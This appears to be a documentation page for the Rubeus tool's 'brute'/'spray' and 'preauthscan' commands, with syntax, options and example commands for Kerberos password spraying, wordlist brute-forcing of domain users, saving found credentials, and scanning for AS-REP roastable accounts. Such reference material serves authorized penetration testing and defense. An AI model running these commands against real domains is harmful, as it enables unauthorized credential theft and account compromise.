{"title": "brute / spray", "source": "rubeus", "source_label": "Rubeus", "path": "brute", "html": "<h1 id=\"brute-spray\">brute / spray</h1>\n<p>Kerberos-based password brute-forcing or password spraying. Can also be invoked as <code>spray</code>.</p>\n<h2 id=\"usage\">Usage</h2>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe brute &lt;/password:&lt;password&gt; | /passwords:&lt;passwords-file&gt;&gt; [/user:&lt;username&gt; | /users:&lt;users-file&gt;] [/domain:&lt;domain&gt;] [/creduser:&lt;domain&gt;\\&lt;username&gt; &amp; /credpassword:&lt;password&gt;] [/ou:OU=...] [/dc:&lt;dc-ip&gt;] [/outfile:&lt;output&gt;] [/noticket] [/verbose] [/nowrap]\n</code></pre></div>\n<h2 id=\"options\">Options</h2>\n<ul>\n<li><code>/password:&lt;password&gt;</code> — single password to test</li>\n<li><code>/passwords:&lt;file&gt;</code> — file containing passwords, one per line</li>\n<li><code>/user:&lt;username&gt;</code> — single user to test</li>\n<li><code>/users:&lt;file&gt;</code> — file containing usernames, one per line</li>\n<li><code>/domain:&lt;domain&gt;</code> — target domain (defaults to current)</li>\n<li><code>/dc:&lt;dc-ip&gt;</code> — domain controller to target</li>\n<li><code>/creduser:&lt;domain&gt;\\&lt;username&gt;</code> — alternate LDAP credentials for user enumeration</li>\n<li><code>/credpassword:&lt;password&gt;</code> — password for alternate credentials</li>\n<li><code>/ou:OU=...</code> — restrict to specific OU</li>\n<li><code>/outfile:&lt;output&gt;</code> — file to write successful credentials to</li>\n<li><code>/noticket</code> — don't display/save TGTs on success</li>\n<li><code>/verbose</code> — show all attempts including failures</li>\n<li><code>/nowrap</code> — don't line-wrap base64 output</li>\n</ul>\n<h2 id=\"examples\">Examples</h2>\n<div class=\"highlight\"><pre><span></span><code># Spray a single password across all users in domain\nRubeus.exe brute /password:&lt;password&gt; /noticket\n\n# Spray against a user list\nRubeus.exe brute /password:&lt;password&gt; /users:users.txt /domain:&lt;domain&gt; /dc:&lt;dc-ip&gt;\n\n# Brute-force a specific user\nRubeus.exe brute /user:&lt;username&gt; /passwords:wordlist.txt /domain:&lt;domain&gt;\n\n# With alternate creds for LDAP enumeration\nRubeus.exe brute /password:&lt;password&gt; /creduser:&lt;domain&gt;\\&lt;username&gt; /credpassword:&lt;password&gt;\n\n# Save successful creds\nRubeus.exe brute /password:&lt;password&gt; /outfile:&lt;output&gt;\n</code></pre></div>\n<h2 id=\"preauthscan\">preauthscan</h2>\n<p>Scan for accounts that do not require Kerberos pre-authentication (AS-REP roastable):</p>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe preauthscan /users:&lt;users-file&gt; [/domain:&lt;domain&gt;] [/dc:&lt;dc-ip&gt;] [/proxyurl:https://KDC_PROXY/kdcproxy]\n</code></pre></div>\n<div class=\"highlight\"><pre><span></span><code># Example\nRubeus.exe preauthscan /users:users.txt /domain:&lt;domain&gt; /dc:&lt;dc-ip&gt;\n</code></pre></div>\n<h2 id=\"notes\">Notes</h2>\n<ul>\n<li>Blocked/disabled accounts are detected and skipped</li>\n<li>On success, a TGT is returned for the valid credential</li>\n</ul>", "excerpt": "brute / spray Kerberos-based password brute-forcing or password spraying. Can also be invoked as spray . Usage Rubeus.exe brute &lt;/password:&lt;password&gt; | /passwords:&lt;passwords-file&gt;&gt; [/user:&lt;username&gt; |…", "tags": []}